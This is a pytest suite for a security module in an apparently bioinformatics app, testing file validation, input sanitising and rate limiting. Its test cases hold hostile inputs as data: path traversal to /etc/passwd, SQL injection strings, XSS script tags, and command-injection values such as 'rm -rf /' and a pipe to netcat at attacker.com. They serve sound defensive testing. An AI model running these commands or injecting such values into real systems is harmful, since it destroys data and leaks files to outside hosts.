"""
Security module tests
"""
import pytest
from pathlib import Path
import tempfile
import time

from src.security.validators import FileValidator, InputSanitizer, RateLimiter


class TestFileValidator:
    """Test suite for FileValidator"""
    
    def test_file_size_validation(self, temp_dir):
        """Test file size validation"""
        validator = FileValidator(max_file_size_mb=1)
        
        # Create small file (should pass)
        small_file = temp_dir / "small.txt"
        small_file.write_text("x" * 100)
        assert validator.validate_file_size(small_file) is True
        
        # Create large file (should fail)
        large_file = temp_dir / "large.txt"
        large_file.write_text("x" * (2 * 1024 * 1024))  # 2MB
        assert validator.validate_file_size(large_file) is False
    
    def test_extension_validation(self):
        """Test file extension validation"""
        validator = FileValidator(allowed_extensions=['.fasta', '.fastq', '.gz'])
        
        assert validator.validate_extension("test.fasta") is True
        assert validator.validate_extension("test.fastq.gz") is True
        assert validator.validate_extension("test.exe") is False
        assert validator.validate_extension("test.txt") is False
    
    def test_path_traversal_detection(self):
        """Test path traversal attack detection"""
        validator = FileValidator()
        
        # Safe paths
        assert validator.is_safe_path("data/datasets/sample.fasta") is True
        assert validator.is_safe_path("results/output.txt") is True
        
        # Unsafe paths
        assert validator.is_safe_path("../../../etc/passwd") is False
        assert validator.is_safe_path("data/../../../etc/passwd") is False
        assert validator.is_safe_path("data/./../../etc/passwd") is False
    
    def test_magic_number_validation(self, temp_dir):
        """Test magic number validation for file types"""
        validator = FileValidator()
        
        # Create FASTA file
        fasta_file = temp_dir / "test.fasta"
        fasta_file.write_text(">seq1\nATCGATCG\n")
        
        # Should detect as text file
        file_type = validator.get_file_type(fasta_file)
        assert "text" in file_type.lower() or "ascii" in file_type.lower()
    
    def test_filename_sanitization(self):
        """Test filename sanitization"""
        validator = FileValidator()
        
        assert validator.sanitize_filename("normal_file.txt") == "normal_file.txt"
        assert validator.sanitize_filename("file with spaces.txt") == "file_with_spaces.txt"
        assert validator.sanitize_filename("../../dangerous.txt") == "dangerous.txt"
        assert validator.sanitize_filename("file@#$%.txt") == "file.txt"


class TestInputSanitizer:
    """Test suite for InputSanitizer"""
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        sanitizer = InputSanitizer()
        
        # Safe inputs
        assert sanitizer.is_sql_safe("normal text") is True
        assert sanitizer.is_sql_safe("sequence_name_123") is True
        
        # SQL injection attempts
        assert sanitizer.is_sql_safe("'; DROP TABLE users; --") is False
        assert sanitizer.is_sql_safe("1 OR 1=1") is False
        assert sanitizer.is_sql_safe("admin'--") is False
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        sanitizer = InputSanitizer()
        
        # Safe inputs
        assert sanitizer.is_command_safe("normal_filename.txt") is True
        assert sanitizer.is_command_safe("dataset_2024") is True
        
        # Command injection attempts
        assert sanitizer.is_command_safe("file.txt; rm -rf /") is False
        assert sanitizer.is_command_safe("file.txt && cat /etc/passwd") is False
        assert sanitizer.is_command_safe("file.txt | nc attacker.com") is False
        assert sanitizer.is_command_safe("$(whoami)") is False
        assert sanitizer.is_command_safe("`id`") is False
    
    def test_html_sanitization(self):
        """Test HTML/XSS sanitization"""
        sanitizer = InputSanitizer()
        
        # Normal text (unchanged)
        assert sanitizer.sanitize_html("normal text") == "normal text"
        
        # HTML entities (escaped)
        result = sanitizer.sanitize_html("<script>alert('xss')</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        
        # Mixed content
        result = sanitizer.sanitize_html("Text with <b>tags</b> & symbols")
        assert "&lt;b&gt;" in result
        assert "&amp;" in result
    
    def test_alphanumeric_validation(self):
        """Test alphanumeric validation"""
        sanitizer = InputSanitizer()
        
        assert sanitizer.is_alphanumeric("abc123") is True
        assert sanitizer.is_alphanumeric("Dataset_2024") is True
        assert sanitizer.is_alphanumeric("test-name") is True
        assert sanitizer.is_alphanumeric("test@name") is False
        assert sanitizer.is_alphanumeric("test;name") is False
    
    def test_sanitize_dataset_name(self):
        """Test dataset name sanitization"""
        sanitizer = InputSanitizer()
        
        assert sanitizer.sanitize_dataset_name("MyDataset_2024") == "MyDataset_2024"
        assert sanitizer.sanitize_dataset_name("Data Set 2024") == "Data_Set_2024"
        assert sanitizer.sanitize_dataset_name("../../../etc/passwd") == "etcpasswd"
        assert sanitizer.sanitize_dataset_name("test@#$%name") == "testname"


class TestRateLimiter:
    """Test suite for RateLimiter"""
    
    def test_basic_rate_limiting(self):
        """Test basic rate limiting functionality"""
        limiter = RateLimiter(max_requests=2, time_window=1)
        
        # First two requests should pass
        assert limiter.is_allowed("user1") is True
        assert limiter.is_allowed("user1") is True
        
        # Third request should be blocked
        assert limiter.is_allowed("user1") is False
    
    def test_time_window_reset(self):
        """Test rate limit window reset"""
        limiter = RateLimiter(max_requests=2, time_window=1)
        
        # Use up quota
        limiter.is_allowed("user1")
        limiter.is_allowed("user1")
        assert limiter.is_allowed("user1") is False
        
        # Wait for window to expire
        time.sleep(1.1)
        
        # Should be allowed again
        assert limiter.is_allowed("user1") is True
    
    def test_independent_user_limits(self):
        """Test that users have independent rate limits"""
        limiter = RateLimiter(max_requests=1, time_window=1)
        
        # User1 uses quota
        assert limiter.is_allowed("user1") is True
        assert limiter.is_allowed("user1") is False
        
        # User2 should still be allowed
        assert limiter.is_allowed("user2") is True
    
    def test_cleanup_old_entries(self):
        """Test cleanup of old rate limit entries"""
        limiter = RateLimiter(max_requests=2, time_window=1)
        
        # Create entries for multiple users
        limiter.is_allowed("user1")
        limiter.is_allowed("user2")
        limiter.is_allowed("user3")
        
        # Verify entries exist
        assert len(limiter._requests) == 3
        
        # Wait for expiry
        time.sleep(1.1)
        
        # Trigger cleanup by making new request
        limiter.is_allowed("user4")
        
        # Old entries should be cleaned up
        limiter.cleanup()
        active_users = [user for user, timestamps in limiter._requests.items() 
                       if timestamps]
        assert len(active_users) <= 1


@pytest.mark.integration
class TestSecurityIntegration:
    """Integration tests for security components"""
    
    def test_complete_file_validation_workflow(self, temp_dir):
        """Test complete file validation workflow"""
        validator = FileValidator(
            max_file_size_mb=1,
            allowed_extensions=['.fasta', '.fastq']
        )
        
        # Create valid FASTA file
        fasta_file = temp_dir / "valid.fasta"
        fasta_file.write_text(">seq1\nATCGATCG\n")
        
        # Validate all aspects
        assert validator.validate_extension(fasta_file.name) is True
        assert validator.validate_file_size(fasta_file) is True
        assert validator.is_safe_path(str(fasta_file)) is True
    
    def test_security_stack_integration(self):
        """Test integration of all security components"""
        validator = FileValidator()
        sanitizer = InputSanitizer()
        limiter = RateLimiter(max_requests=5, time_window=60)
        
        # Simulate user request
        user_id = "test_user"
        filename = "test file.fasta"
        dataset_name = "My Dataset 2024"
        
        # Check rate limit
        assert limiter.is_allowed(user_id) is True
        
        # Sanitize inputs
        safe_filename = validator.sanitize_filename(filename)
        safe_dataset = sanitizer.sanitize_dataset_name(dataset_name)
        
        # Validate
        assert validator.validate_extension(safe_filename) is True
        assert sanitizer.is_alphanumeric(safe_dataset.replace("_", "")) is True
